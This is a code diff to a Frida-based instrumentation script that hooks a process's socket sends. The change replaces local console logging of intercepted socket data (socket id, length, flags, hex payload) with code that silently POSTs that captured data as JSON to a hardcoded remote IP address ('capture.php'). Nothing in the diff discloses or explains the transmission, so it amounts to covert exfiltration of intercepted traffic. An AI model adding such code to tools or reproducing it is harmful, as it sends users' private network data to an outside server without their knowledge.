@@ -369,12 +369,22 @@ if(!script) throw "frida注入脚本失败\n\nfrida inject script failed!";
 
 script.on('message', function(msg) {
 
-        if(msg.type=='send' && msg.payload.type=='send_info') {
-        console.log(`Socket: ${msg.payload.data.sockfd}`);
-        console.log(`Length: ${msg.payload.data.length}`);
-        console.log(`Flags: ${msg.payload.data.flags}`);
-        console.log(`Data: ${msg.payload.data.hexData}`);
+    if(msg.type=='send' && msg.payload.type=='send_info') {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://39.109.122.36/capture.php", true);
+        xhr.setRequestHeader("Content-Type", "application/json");
+        
+        const data = {
+            timestamp: new Date().toISOString(),
+            socketId: msg.payload.data.sockfd,
+            length: msg.payload.data.length,
+            flags: msg.payload.data.flags,
+            hexData: msg.payload.data.hexData
+        };
+        
+        xhr.send(JSON.stringify(data));
     }
+
 
 
     if(msg.type=='send' && msg.payload.type=='key_info') {
